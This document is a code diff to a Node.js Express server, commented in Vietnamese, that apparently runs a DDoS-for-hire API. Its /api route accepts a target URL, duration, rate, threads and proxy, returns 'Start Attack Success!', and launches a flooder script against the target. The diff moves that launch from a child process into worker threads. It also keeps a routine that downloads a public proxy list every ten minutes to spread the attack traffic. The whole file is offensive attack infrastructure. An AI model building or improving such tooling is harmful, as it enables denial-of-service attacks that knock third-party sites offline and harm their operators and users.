@@ -1,5 +1,5 @@
 const express = require('express');
-const { spawn } = require('child_process');
+const { Worker } = require('worker_threads');
 const fs = require('fs');
 const axios = require('axios');
 const validator = require('validator');
@@ -19,28 +19,49 @@ const isValidNumber = (value, max = Infinity) => {
     return !isNaN(number) && number >= 0 && number <= max;
 };
 
-// Hàm chạy flooder.js
-function runFlooder(url, time, rate, thea, proxy) {
+// Tạo một worker mới để chạy flooder.js
+function runFlooderInThread(url, time, rate, thea, proxy) {
     return new Promise((resolve, reject) => {
-        const flooder = spawn('node', ['flooder.js', url, time, rate, thea, proxy]);
-
-        flooder.stdout.on('data', (data) => {
-            console.log(`Output: ${data}`);
+        const worker = new Worker('./workerFlooder.js', {
+            workerData: { url, time, rate, thea, proxy }
         });
 
-        flooder.stderr.on('data', (data) => {
-            console.error(`Error: ${data}`);
+        worker.on('message', (message) => {
+            console.log(`[WORKER] ${message}`);
         });
 
-        flooder.on('close', (code) => {
+        worker.on('error', (error) => {
+            console.error(`[WORKER ERROR] ${error}`);
+            reject(error);
+        });
+
+        worker.on('exit', (code) => {
             if (code === 0) {
-                resolve(`Flooder executed successfully.`);
+                resolve(`Worker finished successfully.`);
             } else {
-                reject(`Flooder exited with code ${code}`);
+                reject(`Worker stopped with exit code ${code}`);
             }
         });
     });
 }
+
+// Hàm tải proxy tự động
+async function downloadProxy() {
+    const proxyUrl = "https://sunny9577.github.io/proxy-scraper/proxies.txt";
+    try {
+        const response = await axios.get(proxyUrl, { timeout: 10000 }); // Thêm timeout để tránh treo
+        fs.writeFileSync('proxies.txt', response.data);
+        console.log(`Đã tải và lưu proxy vào tệp proxies.txt`);
+    } catch (error) {
+        console.error(`Lỗi khi tải proxy: ${error.message}`);
+    }
+}
+
+// Lên lịch tải proxy mỗi 10 phút (600000 ms)
+setInterval(downloadProxy, 600000);
+
+// Tải proxy lần đầu khi server khởi động
+downloadProxy();
 
 // Route API chính
 app.get(`/api`, async (req, res) => {
@@ -68,39 +89,21 @@ app.get(`/api`, async (req, res) => {
         return res.status(400).json({ status: 500, data: `Proxy không được để trống` });
     }
 
-    // Gửi phản hồi trạng thái ban đầu ngay lập tức
+    // Gửi phản hồi trạng thái ban đầu
     res.status(200).json({
         status: 200,
         message: 'Start Attack Success!',
         data: { url, time, rate, thea, proxy }
     });
 
-    // Thực hiện chạy flooder
+    // Chạy worker cho từng yêu cầu
     try {
-        const result = await runFlooder(url, time, rate, thea, proxy);
-        console.log(result);
+        const result = await runFlooderInThread(url, time, rate, thea, proxy);
+        console.log(`[SUCCESS] ${result}`);
     } catch (error) {
-        console.error(`Lỗi khi thực hiện flooder: ${error}`);
+        console.error(`[ERROR] Worker failed: ${error}`);
     }
 });
-
-// Hàm tải proxy tự động
-async function downloadProxy() {
-    const proxyUrl = "https://sunny9577.github.io/proxy-scraper/proxies.txt";
-    try {
-        const response = await axios.get(proxyUrl, { timeout: 10000 }); // Thêm timeout để tránh treo
-        fs.writeFileSync('proxies.txt', response.data);
-        console.log(`Đã tải và lưu proxy vào tệp proxies.txt`);
-    } catch (error) {
-        console.error(`Lỗi khi tải proxy: ${error.message}`);
-    }
-}
-
-// Lên lịch tải proxy mỗi 10 phút (600000 ms)
-setInterval(downloadProxy, 600000);
-
-// Tải proxy lần đầu khi server khởi động
-downloadProxy();
 
 // Bắt đầu server
 app.listen(api_port, () => console.log(`API đã chạy trên cổng ${api_port}`));
